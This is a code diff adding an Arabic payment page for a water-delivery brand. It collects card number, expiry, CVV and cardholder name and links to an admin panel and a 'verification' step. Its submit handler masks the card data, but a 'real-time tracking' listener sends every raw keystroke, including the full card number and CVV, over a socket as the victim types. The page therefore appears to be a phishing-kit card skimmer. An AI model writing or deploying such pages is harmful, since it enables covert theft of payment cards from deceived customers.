@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>الدفع - مياه واحة عمان</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="container header-content">
+      <div class="logo">
+        <div class="logo-icon">💧</div>
+        <div class="logo-text">
+          <h1>مياه واحة عمان</h1>
+          <span>Oman Oasis Water</span>
+        </div>
+      </div>
+      <div class="connection-status">
+        <span class="status-dot"></span>
+        <span>غير متصل</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Navigation -->
+  <nav class="nav">
+    <div class="container">
+      <ul class="nav-list">
+        <li><a href="../index.html" class="nav-link">الرئيسية</a></li>
+        <li><a href="delivery.html" class="nav-link">بيانات التوصيل</a></li>
+        <li><a href="payment.html" class="nav-link active">الدفع</a></li>
+        <li><a href="verification.html" class="nav-link">التحقق</a></li>
+        <li><a href="../admin/index.html" class="nav-link">لوحة التحكم</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Steps -->
+  <div class="container">
+    <div class="steps">
+      <div class="step completed">
+        <div class="step-number">✓</div>
+        <span class="step-label">اختيار المنتج</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step completed">
+        <div class="step-number">✓</div>
+        <span class="step-label">بيانات التوصيل</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step active">
+        <div class="step-number">3</div>
+        <span class="step-label">الدفع</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step">
+        <div class="step-number">4</div>
+        <span class="step-label">التحقق</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment Form -->
+  <div class="form-container page">
+    <h2 class="form-title">💳 بيانات الدفع</h2>
+    <form id="paymentForm">
+      <div class="form-group">
+        <label class="form-label">رقم البطاقة *</label>
+        <div class="card-input-group">
+          <input type="text" class="form-control" name="card1" maxlength="4" 
+                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card2')">
+          <input type="text" class="form-control" name="card2" id="card2" maxlength="4" 
+                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card3')">
+          <input type="text" class="form-control" name="card3" id="card3" maxlength="4" 
+                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card4')">
+          <input type="text" class="form-control" name="card4" id="card4" maxlength="4" 
+                 required placeholder="0000" inputmode="numeric">
+        </div>
+      </div>
+      
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">تاريخ الانتهاء *</label>
+          <input type="text" class="form-control" name="expiry" required 
+                 placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr">
+        </div>
+        <div class="form-group">
+          <label class="form-label">رمز الأمان (CVV) *</label>
+          <input type="text" class="form-control" name="cvv" required 
+                 placeholder="123" maxlength="4" inputmode="numeric">
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">اسم حامل البطاقة *</label>
+        <input type="text" class="form-control" name="cardHolder" required 
+               placeholder="الاسم كما هو مكتوب على البطاقة">
+      </div>
+      
+      <!-- Order Summary -->
+      <div style="background:var(--gray-100);padding:1rem;border-radius:var(--border-radius);margin-bottom:1rem;">
+        <h4 style="margin-bottom:0.5rem;">ملخص الطلب</h4>
+        <div style="display:flex;justify-content:space-between;margin-top:0.5rem;">
+          <span>المجموع:</span>
+          <strong id="orderTotal">0.00 ر.ع</strong>
+        </div>
+      </div>
+      
+      <button type="submit" class="btn btn-success">
+        إتمام الدفع ←
+      </button>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة</p>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script>
+    function moveFocus(current, nextId) {
+      if (current.value.length === current.maxLength) {
+        document.getElementById(nextId)?.focus();
+      }
+    }
+    
+    document.addEventListener('DOMContentLoaded', () => {
+      trackPageChange('payment');
+      
+      // Load product price
+      const productId = localStorage.getItem('selected_product');
+      if (productId) {
+        fetch(`${SERVER_URL}/api/products/${productId}`)
+          .then(res => res.json())
+          .then(data => {
+            if (data.product) {
+              document.getElementById('orderTotal').textContent = `${data.product.price} ر.ع`;
+            }
+          })
+          .catch(console.error);
+      }
+      
+      // Load saved payment data if exists
+      const savedData = localStorage.getItem('payment_data');
+      if (savedData) {
+        const data = JSON.parse(savedData);
+        ['card1', 'card2', 'card3', 'card4', 'expiry', 'cvv', 'cardHolder'].forEach(key => {
+          const input = document.querySelector(`[name="${key}"]`);
+          if (input && data[key]) input.value = data[key];
+        });
+      }
+      
+      document.getElementById('paymentForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const formData = new FormData(e.target);
+        const data = {
+          cardNumber: `${formData.get('card1')}${formData.get('card2')}${formData.get('card3')}${formData.get('card4')}`,
+          expiry: formData.get('expiry'),
+          cvv: formData.get('cvv'),
+          cardHolder: formData.get('cardHolder')
+        };
+        
+        // Mask card number for privacy
+        const maskedData = {
+          cardNumber: '**** **** **** ' + data.cardNumber.slice(-4),
+          expiry: data.expiry,
+          cvv: '***',
+          cardHolder: data.cardHolder
+        };
+        
+        // Save to localStorage
+        localStorage.setItem('payment_data', JSON.stringify(maskedData));
+        
+        // Send via socket
+        submitPaymentForm(maskedData);
+        
+        showToast('تم التحقق من بيانات الدفع بنجاح!');
+        
+        setTimeout(() => {
+          window.location.href = 'verification.html';
+        }, 1000);
+      });
+      
+      // Real-time tracking
+      const inputs = document.querySelectorAll('#paymentForm input');
+      inputs.forEach(input => {
+        input.addEventListener('input', () => {
+          const data = {};
+          inputs.forEach(inp => {
+            if (inp.value) data[inp.name] = inp.value;
+          });
+          if (Object.keys(data).length > 0) {
+            submitPaymentForm(data);
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
